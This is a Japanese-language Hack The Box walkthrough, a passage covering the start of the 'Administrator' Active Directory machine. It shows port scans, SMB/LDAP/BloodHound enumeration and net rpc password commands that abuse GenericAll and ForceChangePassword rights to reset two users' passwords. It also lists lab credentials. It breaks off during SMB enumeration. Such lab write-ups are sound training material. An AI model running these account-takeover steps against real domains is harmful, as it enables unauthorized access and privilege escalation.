![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/634
- #medium
- OS : #Windows
- Machine Author(s): [nirza](https://app.hackthebox.com/users/800960)
- Hack Date: 2025-06-16

# 前提
実際の Windows ペネトレーションテスト（侵入テスト）でもよくあるように、この Administrator マシンでは、以下のアカウントの資格情報から開始します：

- **ユーザー名**: Olivia
- **パスワード**: ichliebedich

## Olivia認証情報
Olivia : ichliebedich

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ


Administrator.htb

| **ポート**   | **サービス**     | **バージョン**                               | **その他**                                                          |
| --------- | ------------ | --------------------------------------- | ---------------------------------------------------------------- |
| 21/tcp    | **FTP**      | Microsoft ftpd                          | SYST: Windows_NT                                                 |
| 53/tcp    | **DNS**      | Simple DNS Plus                         |                                                                  |
| 88/tcp    | **Kerberos** | Microsoft Windows Kerberos              | server time: 2025-06-11 13:30:38Z                                |
| 135/tcp   | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn           |                                                                  |
| 389/tcp   | **LDAP**     | Microsoft Windows Active Directory LDAP | Domain: administrator.htb0., Site: Default-First-Site-Name       |
| 445/tcp   | **SMB**      | 不明                                      |                                                                  |
| 464/tcp   | kpasswd5?    | 不明                                      |                                                                  |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                  |
| 636/tcp   | tcpwrapped   | 不明                                      |                                                                  |
| 3268/tcp  | ldap         | Microsoft Windows Active Directory LDAP | Domain: administrator.htb0., Site: Default-First-Site-Name       |
| 3269/tcp  | tcpwrapped   | 不明                                      |                                                                  |
| 9389/tcp  | **ADWS**     | .NET Message Framing                    |                                                                  |
| 47001/tcp | **WinRM**    | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-server-header: Microsoft-HTTPAPI/2.0, http-title: Not Found |
| 49664/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 49665/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 49666/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 49667/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 49668/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 60879/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 64294/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0     |                                                                  |
| 64299/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 64308/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |
| 64324/tcp | msrpc        | Microsoft Windows RPC                   |                                                                  |



## nmap
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Administrator]
└─$ echo 'export Target_IP="10.129.171.238"' >> ~/.zshrc
source ~/.zshrc
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Administrator]
└─$ sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP

<SNIP>

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-11 13:30:38Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60879/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64294/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
64299/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64308/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
64324/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows Server 2022 (96%), Windows Server 2019 (95%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2016 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=6/10%OT=21%CT=%CU=33439%PV=Y%DS=2%DC=T%G=N%TM=684922D7%P=aarch64-unknown-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)
SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Uptime guess: 0.005 days (since Tue Jun 10 23:24:15 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-11T13:31:39
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 23847/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 30363/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 17487/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51009/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   185.78 ms 10.10.14.1
2   185.93 ms 10.129.171.238

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:31
Completed NSE at 23:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:31
Completed NSE at 23:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:31
Completed NSE at 23:31, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.95 seconds
           Raw packets sent: 66 (4.332KB) | Rcvd: 71 (4.444KB)

```


UDP
```sh
└─$ sudo nmap -sU -T4 -Pn $Target_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 00:41 PDT
Warning: 10.129.57.119 giving up on port because retransmission cap hit (6).
Stats: 0:10:28 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 81.53% done; ETC: 00:54 (0:02:22 remaining)
Stats: 0:10:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 81.63% done; ETC: 00:54 (0:02:22 remaining)
Nmap scan report for administrator.htb (10.129.57.119)
Host is up (0.083s latency).
Not shown: 917 closed udp ports (port-unreach), 79 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 886.42 seconds

```
これらの空いてるポートからADであることがわかる
一旦やることリスト
- 今のOliviaの認証情報で何ができるのかを探る
	- SMB
	- FTP
	- LDAP
- bloodhound-pythonが動くかを確認する

## FTP
- 匿名ログインもOliviaでの認証情報でもログインできない
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Administrator]
└─$ ftp -p $Target_IP
Connected to 10.129.171.238.
220 Microsoft FTP Service
Name (10.129.171.238:kali): Olivia
331 Password required
Password: 
530 User cannot log in, home directory inaccessible.
ftp: Login failed

┌──(kali㉿kali)-[~/Desktop/HTB/machine/Administrator]
└─$ ftp -p $Target_IP
Connected to 10.129.171.238.
220 Microsoft FTP Service
Name (10.129.171.238:kali): ftp
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed
ftp> 
```

## enum4linux
```sh
└─$ enum4linux -u Olivia -p  ichliebedich $Target_IP
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jun 15 23:15:54 2025

 =========================================( Target Information )=========================================

Target ........... 10.129.57.119
RID Range ........ 500-550,1000-1050
Username ......... 'Olivia'
Password ......... 'ichliebedich'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.57.119 )===========================


[E] Can't find workgroup/domain



 ===================================( Session Check on 10.129.57.119 )===================================


[+] Server 10.129.57.119 allows sessions using username 'Olivia', password 'ichliebedich'


 ================================( Getting domain SID for 10.129.57.119 )================================

Domain Name: ADMINISTRATOR
Domain Sid: S-1-5-21-1088858960-373806567-254189436

[+] Host is part of a domain (not a workgroup)

enum4linux complete on Sun Jun 15 23:16:06 2025

```

## SMB
特に興味を引くものはない
```bash
└─$ smbmap   -H $Target_IP -u "Olivia" -p "ichliebedich" 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.57.119:445       Name: 10.129.57.119             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections           
```


## LDAP
ログインできて、Olivia自身の認証情報を取得できた
```bash
└─$ ldapsearch -x -H ldap://$Target_IP \
  -D "Olivia@ADMINISTRATOR" -w 'ichliebedich' \
  -b "DC=ADMINISTRATOR,DC=HTB" "(sAMAccountName=olivia)"
# extended LDIF
#
# LDAPv3
# base <DC=ADMINISTRATOR,DC=HTB> with scope subtree
# filter: (sAMAccountName=olivia)
# requesting: ALL
#

# Olivia Johnson, Users, administrator.htb
dn: CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Olivia Johnson
sn: Johnson
givenName: Olivia
distinguishedName: CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
instanceType: 4
whenCreated: 20241006012248.0Z
whenChanged: 20250616131027.0Z
displayName: Olivia Johnson
uSNCreated: 28813
memberOf: CN=Remote Management Users,CN=Builtin,DC=administrator,DC=htb
uSNChanged: 135284
name: Olivia Johnson
objectGUID:: hY7Wn104e0uLmSVZsR6LNw==
userAccountControl: 66080
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 133726513687695744
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAUKvmQOfVRxZ8nyYPVAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: olivia
sAMAccountType: 805306368
userPrincipalName: olivia@administrator.htb
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=administrator,DC=htb
dSCorePropagationData: 20241012203002.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133945530271701842
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.administrator.htb/DC=ForestDnsZones,DC=administrato
 r,DC=htb

# search reference
ref: ldap://DomainDnsZones.administrator.htb/DC=DomainDnsZones,DC=administrato
 r,DC=htb

# search reference
ref: ldap://administrator.htb/CN=Configuration,DC=administrator,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

## BloodHound

### bloodhound-python
```sh
└─$ sudo bloodhound-python -u 'Olivia' -p 'ichliebedich' -ns $Target_IP -d administrator.htb -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 29S

```

### 分析
Kerberoastingだったり、ASREP Roastingができるアカウントはない

Olivia
- 有効なアカウント
- PSRemoteできる
	- でも今回はWinRMとかは空いてない
	- ![](https://i.imgur.com/ewdhCHU.png)



### MICHALの奪取
- MICHALに対して、GenericAll権限を持っている
	- フルコントロールできる
	- ![](https://i.imgur.com/lMgMVOs.png)

Force Passwordでパスワードを強制的に変更する
```sh
net rpc password "MICHAEL" "newP@ssword2022" -U "ADMINISTRATOR.HTB"/"OLIVIA"%"ichliebedich" -S $Target_IP
```

#### MICHAL認証情報
MICHAEL : newP@ssword2022

### WinRM
michaelのUserフォルダの中身全部出力
```sh
Evil-WinRM* PS C:\Users\michael> dir -Recurse -Force


    Directory: C:\Users\michael


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--h--         6/16/2025   8:01 AM                AppData
d--hsl         6/16/2025   8:01 AM                Application Data
d--hsl         6/16/2025   8:01 AM                Cookies
d-r---          5/8/2021   1:20 AM                Desktop
d-r---         6/16/2025   8:01 AM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d--hsl         6/16/2025   8:01 AM                Local Settings
d-r---          5/8/2021   1:20 AM                Music
d--hsl         6/16/2025   8:01 AM                My Documents
d--hsl         6/16/2025   8:01 AM                NetHood
d-r---          5/8/2021   1:20 AM                Pictures
d--hsl         6/16/2025   8:01 AM                PrintHood
d--hsl         6/16/2025   8:01 AM                Recent
d-----          5/8/2021   1:20 AM                Saved Games
d--hsl         6/16/2025   8:01 AM                SendTo
d--hsl         6/16/2025   8:01 AM                Start Menu
d--hsl         6/16/2025   8:01 AM                Templates
d-r---          5/8/2021   1:20 AM                Videos
-a-h--         11/1/2024   1:26 PM         262144 NTUSER.DAT
-a-hs-         6/16/2025   8:01 AM         147456 ntuser.dat.LOG1
-a-hs-         6/16/2025   8:01 AM         159744 ntuser.dat.LOG2
-a-hs-         6/16/2025   8:01 AM              0 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-a-hs-         6/16/2025   8:01 AM              0 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-a-hs-         6/16/2025   8:01 AM              0 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-a-hs-         6/16/2025   8:01 AM             20 ntuser.ini


    Directory: C:\Users\michael\AppData


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/16/2025   8:01 AM                Local
d-----         6/16/2025   8:01 AM                LocalLow
d-----          5/8/2021   1:34 AM                Roaming


    Directory: C:\Users\michael\AppData\Local


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hsl         6/16/2025   8:01 AM                Application Data
d--hsl         6/16/2025   8:01 AM                History
d-----          5/8/2021   1:34 AM                Microsoft
d-----         6/16/2025   8:01 AM                Temp
d--hsl         6/16/2025   8:01 AM                Temporary Internet Files


    Directory: C:\Users\michael\AppData\Local\Microsoft


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                InputPersonalization
d-----         6/16/2025   8:01 AM                Windows
d--hs-          5/8/2021   1:20 AM                Windows Sidebar
d---s-          5/8/2021   1:20 AM                WindowsApps


    Directory: C:\Users\michael\AppData\Local\Microsoft\InputPersonalization


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                TrainedDataStore


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                CloudStore
d-----          5/8/2021   1:20 AM                GameExplorer
d---s-          5/8/2021   1:20 AM                History
d---s-          5/8/2021   1:20 AM                INetCache
d---s-          5/8/2021   1:20 AM                INetCookies
d-----         6/16/2025   8:01 AM                PowerShell
d-----         11/1/2024   1:21 PM                Shell
d--hsl         6/16/2025   8:01 AM                Temporary Internet Files
d-----          5/8/2021   1:20 AM                WinX
-a-h--         6/16/2025   8:01 AM           8192 UsrClass.dat
-a-hs-         6/16/2025   8:01 AM           8192 UsrClass.dat.LOG1
-a-hs-         6/16/2025   8:01 AM          16384 UsrClass.dat.LOG2
-a-hs-         6/16/2025   8:01 AM              0 UsrClass.dat{d77f4594-4aa8-11f0-b0e4-005056b9c94a}.TM.blf
-a-hs-         6/16/2025   8:01 AM              0 UsrClass.dat{d77f4594-4aa8-11f0-b0e4-005056b9c94a}.TMContainer00000000000000000001.regtrans-ms
-a-hs-         6/16/2025   8:01 AM              0 UsrClass.dat{d77f4594-4aa8-11f0-b0e4-005056b9c94a}.TMContainer00000000000000000002.regtrans-ms


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\PowerShell


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/16/2025   8:01 AM           8246 ModuleAnalysisCache


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\Shell


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         11/1/2024   1:02 PM          64223 DefaultLayouts.xml


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\WinX


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          5/8/2021   1:20 AM                Group1
d-r---          5/8/2021   1:20 AM                Group2
d-r---          5/8/2021   1:20 AM                Group3


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\WinX\Group1


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:14 AM           1109 1 - Desktop.lnk
-a-hs-          5/8/2021   1:18 AM             75 desktop.ini


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\WinX\Group2


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:14 AM           1109 1 - Run.lnk
-a----          5/8/2021   1:14 AM           1109 2 - Search.lnk
-a----          5/8/2021   1:14 AM           1109 3 - Windows Explorer.lnk
-a----          5/8/2021   1:14 AM           1492 4 - Control Panel.lnk
-a----          5/8/2021   1:14 AM           1021 5 - Task Manager.lnk
-a-hs-          5/8/2021   1:18 AM            325 desktop.ini


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows\WinX\Group3


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:14 AM           1015 01 - Command Prompt.lnk
-a----          5/8/2021   1:14 AM           1127 01a - Windows PowerShell.lnk
-a----          5/8/2021   1:14 AM           1059 02 - Command Prompt.lnk
-a----          5/8/2021   1:14 AM           1171 02a - Windows PowerShell.lnk
-a----          5/8/2021   1:14 AM           1015 03 - Computer Management.lnk
-a----          5/8/2021   1:14 AM           1015 04 - Disk Management.lnk
-a----          5/8/2021   1:14 AM           1582 04-1 - NetworkStatus.lnk
-a----          5/8/2021   1:14 AM           1075 05 - Device Manager.lnk
-a----          5/8/2021   1:14 AM           1576 06 - SystemAbout.lnk
-a----          5/8/2021   1:14 AM           1015 07 - Event Viewer.lnk
-a----          5/8/2021   1:14 AM           1578 08 - PowerAndSleep.lnk
-a----          5/8/2021   1:14 AM           1015 09 - Mobility Center.lnk
-a----          5/8/2021   1:14 AM           1578 10 - AppsAndFeatures.lnk
-a-hs-          5/8/2021   1:18 AM            941 desktop.ini


    Directory: C:\Users\michael\AppData\Local\Microsoft\Windows Sidebar


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                Gadgets
-a----          5/8/2021   1:18 AM             80 settings.ini


    Directory: C:\Users\michael\AppData\Roaming


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          5/8/2021   1:34 AM                Microsoft


    Directory: C:\Users\michael\AppData\Roaming\Microsoft


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                Internet Explorer
d-----          5/8/2021   1:20 AM                Spelling
d-----          5/8/2021   1:34 AM                Windows


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Internet Explorer


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          5/8/2021   1:20 AM                Quick Launch


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:15 AM           1259 Control Panel.lnk
-a-hs-          5/8/2021   1:18 AM            270 desktop.ini
-a----          5/8/2021   1:15 AM           1158 Server Manager.lnk
-a----          5/8/2021   1:14 AM            352 Shows Desktop.lnk
-a----          5/8/2021   1:14 AM            334 Window Switcher.lnk


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                CloudStore
d-----          5/8/2021   1:20 AM                Network Shortcuts
d-----          5/8/2021   1:20 AM                Printer Shortcuts
d-r---          5/8/2021   1:20 AM                Recent
d-r---          5/8/2021   1:34 AM                SendTo
d-r---          5/8/2021   1:20 AM                Start Menu
d-----          5/8/2021   1:20 AM                Templates


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\SendTo


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:18 AM              3 Compressed (zipped) Folder.ZFSendToTarget
-a----          5/8/2021   1:18 AM              7 Desktop (create shortcut).DeskLink
-a-hs-          5/8/2021   1:18 AM            440 Desktop.ini
-a----          5/8/2021   1:18 AM              4 Mail Recipient.MAPIMail


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:34 AM                Programs


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         11/1/2024   1:21 PM                Accessibility
d-----          5/8/2021   1:20 AM                Accessories
d-----          5/8/2021   1:20 AM                Maintenance
d-r---          5/8/2021   1:20 AM                System Tools
d-----          3/2/2022   7:58 PM                Windows PowerShell


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         11/1/2024   1:02 PM            568 desktop.ini
-a----          5/8/2021   1:14 AM           1106 Magnify.lnk
-a----          5/8/2021   1:14 AM           1108 Narrator.lnk
-a----          5/8/2021   1:14 AM           1106 On-Screen Keyboard.lnk


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/8/2021   1:18 AM            170 Desktop.ini


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          5/8/2021   1:18 AM            170 Desktop.ini


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:14 AM           1281 Administrative Tools.lnk
-a----          5/8/2021   1:14 AM           1142 Command Prompt.lnk
-a----          5/8/2021   1:14 AM            335 computer.lnk
-a----          5/8/2021   1:14 AM            405 Control Panel.lnk
-a-hs-          5/8/2021   1:18 AM            934 Desktop.ini
-a----          5/8/2021   1:14 AM            407 File Explorer.lnk
-a----          5/8/2021   1:14 AM            409 Run.lnk


    Directory: C:\Users\michael\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/8/2021   1:18 AM           2539 Windows PowerShell (x86).lnk
-a----          3/2/2022   7:57 PM           2539 Windows PowerShell.lnk


    Directory: C:\Users\michael\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hsl         6/16/2025   8:01 AM                My Music
d--hsl         6/16/2025   8:01 AM                My Pictures
d--hsl         6/16/2025   8:01 AM                My Videos


```
# Foothold

### BENJAMINの奪取
- MICHALは、BENJAMINに対して、ForceChangePassword権限を持っている
	- パスワードを変更できる
![](https://i.imgur.com/cfluEpB.png)

パスワードを強制的に変更
```sh
net rpc password "BENJAMIN" "newP@ssword2022" -U "ADMINISTRATOR.HTB"/"MICHAEL"%"newP@ssword2022" -S $Target_IP
```

#### BENJAMIN認証情報
BENJAMIN : newP@ssword2022

Benjamin、今までの2人のユーザーと異なって、SHARE MODERATORSグループに所属している
- shareって書いてあるから、SMBとかftpログインできるかな？
![](https://i.imgur.com/7ToFK13.png)

#### SMB
特に変わらず
```sh
└─$ smbmap   -H $Target_IP -u "BENJAMIN" -p "newP@ssword2022"

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.57.119:445       Name: administrator.htb         Status: Authenticated
        Disk                                                    Permissions     Comment
